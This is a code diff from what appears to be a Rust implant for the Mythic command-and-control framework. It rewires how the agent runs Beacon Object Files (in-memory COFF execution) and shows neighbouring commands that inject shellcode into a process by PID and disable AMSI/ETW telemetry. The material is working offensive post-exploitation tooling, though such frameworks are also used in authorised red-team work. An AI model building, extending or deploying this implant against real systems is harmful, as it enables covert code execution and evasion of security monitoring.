@@ -1,7 +1,4 @@
 use link_common::dispatch::dispatch_common;
-
-#[cfg(feature = "cmd-bof")]
-use crate::bof::bof_cmd;
 use std::env;
 use std::process::Command;
 
@@ -46,7 +43,18 @@ pub fn link_loop() {
             integrity_level: get_integrity_level_int(),
         },
         dispatch,
+        bof_exec,
     );
+}
+
+#[cfg(feature = "cmd-bof")]
+fn bof_exec(coff: &[u8], entrypoint: &str, args: &str) -> String {
+    crate::bof::bof_exec(coff, entrypoint, args)
+}
+
+#[cfg(not(feature = "cmd-bof"))]
+fn bof_exec(_coff: &[u8], _entrypoint: &str, _args: &str) -> String {
+    "[-] bof command not compiled into this payload".into()
 }
 
 /// Convert the text integrity level to the integer Mythic expects.
@@ -81,8 +89,6 @@ fn dispatch(command: &str, parameters: &str) -> link_common::CommandOutput {
             let sc = link_common::extract_param(parameters, "shellcode");
             inject_cmd(&format!("{} {}", pid, sc)).into()
         }
-        #[cfg(feature = "cmd-bof")]
-        link_common::cmds::BOF => bof_cmd(parameters).into(),
         link_common::cmds::AMSI_ETW if cfg!(feature = "cmd-amsi-etw") => {
             crate::amsi_etw::amsi_etw_cmd(parameters).into()
         }
